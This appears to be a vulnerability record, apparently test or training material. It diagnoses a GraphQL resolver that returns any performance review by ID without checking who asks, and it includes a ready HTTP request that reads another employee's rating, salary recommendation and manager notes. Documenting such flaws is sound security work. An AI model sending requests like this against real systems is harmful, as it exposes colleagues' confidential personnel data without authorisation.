diagnosis: The GraphQL resolver queries PerformanceReview by review_id directly without checking whether info.context.user is the employee being evaluated, the reviewing manager, or an authorized HR specialist. Any authenticated employee can read sensitive salary reviews and peer ratings of all colleagues.
exploit_request:
POST /graphql/ HTTP/1.1
Host: hr.example.com
Authorization: Bearer <employee_token>
Content-Type: application/json

{"query": "query { performanceReview(reviewId: 541) { id rating salaryRecommendation managerNotes } }"}
